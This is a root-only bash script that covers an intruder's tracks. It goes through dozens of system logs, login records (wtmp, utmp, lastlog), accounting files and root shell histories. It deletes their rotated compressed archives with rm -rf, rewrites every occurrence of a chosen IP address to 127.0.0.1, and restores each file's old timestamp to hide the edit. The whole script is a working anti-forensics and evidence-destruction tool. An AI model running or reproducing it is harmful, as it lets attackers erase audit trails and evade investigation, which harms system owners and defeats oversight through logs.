#!/bin/bash

if [ `whoami` != "root" ];then
  echo "Please run this script as root!"
  exit 1
fi

if [ $# -lt 1 ]; then
    echo "error: please input need to be changed ip"
    exit 1
fi

base_files=(
"/var/spool/tmp"
	"/var/spool/locks"
	"/var/spool/errors"
	"/var/run/utmp"
	"/var/log/xferlog"
	"/var/log/wtmp"
	"/var/log/warn"
	"/var/log/user.log"
	"/var/log/thttpd_log"
	"/var/log/telnetd"
	"/var/log/syslog"
	"/var/log/spooler"
	"/var/log/snort"
	"/var/log/smtpd"
	"/var/log/secure"
	"/var/log/qmail"
	"/var/log/proftpd/xferlog.legacy"
	"/var/log/proftpd.xferlog"
	"/var/log/proftpd.access_log"
	"/var/log/poplog"
	"/var/log/news/suck.notice"
	"/var/log/news/suck.err"
	"/var/log/news/news.notice"
	"/var/log/news/news.err"
	"/var/log/news/news.crit"
	"/var/log/news/news.all"
	"/var/log/news/news"
	"/var/log/news.all"
	"/var/log/news"
	"/var/log/nctfpd.errs"
	"/var/log/ncftpd/misclog.txt"
	"/var/log/mysqld/mysqld.log"
	"/var/log/messages"
	"/var/log/mail/info.log"
	"/var/log/mail/errors.log"
	"/var/log/lastlog"
	"/var/log/httpsd/ssl_log"
	"/var/log/httpsd/ssl.access_log"
	"/var/log/httpd/error_log"
	"/var/log/explanations"
	"/var/log/daemons/warnings.log"
	"/var/log/daemons/info.log"
	"/var/log/daemons/errors.log"
	"/var/log/cups/error_log"
	"/var/log/cups/access_log"
	"/var/log/bandwidth"
	"/var/log/auth.log"
	"/var/log/auth"
	"/var/log/acct"
	"/var/apache/logs"
	"/var/apache/log"
	"/var/adm"
	"/var/account/pacct"
	"/usr/local/www/logs/thttpd_log"
	"/usr/local/apache/logs"
	"/usr/local/apache/log"
	"/root/.Xauthority"
	"/root/.sh_history"
	"/root/.logout"
	"/root/.login"
	"/root/.ksh_history"
	"/root/.history"
	"/root/.bash_logut"
	"/root/.bash_history"
	"/etc/wtmp"
	"/etc/utmp"
	"/etc/mail/access"
	"/etc/httpd/logs/error_log"
)


old_ip="$1"
shift
user_files=("$@")

if [ ${#user_files[@]} -gt 0 ]; then
    base_files+=("${user_files[@]}")
fi

declare -A matched_files

for base_file in "${base_files[@]}"; do
    if [ -e "$base_file" ]; then
        matched_files["$base_file"]=1
    fi
    
    for file in $base_file*; do
        [ -e "$file" ] || continue
        
        [ "$file" == "$base_file" ] && continue
        
        if [[ "$file" =~ \.[0-9]+\.(tar.gz|tar.Z|tar|gz|tgz|tar.bz2|bz2|Z|zip|rar|7z)$ ]]; then
            rm -rf $file
        fi
        if [[ "$file" =~ \.[0-9]+$ ]]; then
            matched_files["$file"]=1
        fi
    done
done

escaped_ip=$(sed 's/\./\\./g' <<< "$old_ip") 

if [ ${#matched_files[@]} -eq 0 ]; then
    echo "not match any files"
else
    for file in "${!matched_files[@]}"; do
        if [ -f "$file" ]; then
    	    mod_time=$(stat -c %Y "$file") 
	    new_date=$(date -d "@$mod_time" "+%Y%m%d%H%M.%S")
            echo "deal file：$file"
            sed -i "s/${escaped_ip}/127.0.0.1/g" "$file"
	    touch -mt "$new_date" "$file"
            echo ">>> replace done：old IP [$old_ip] → new IP [127.0.0.1]"
        else
            echo "skip file：$file not exist"
    fi
    done
fi

echo "all done!"
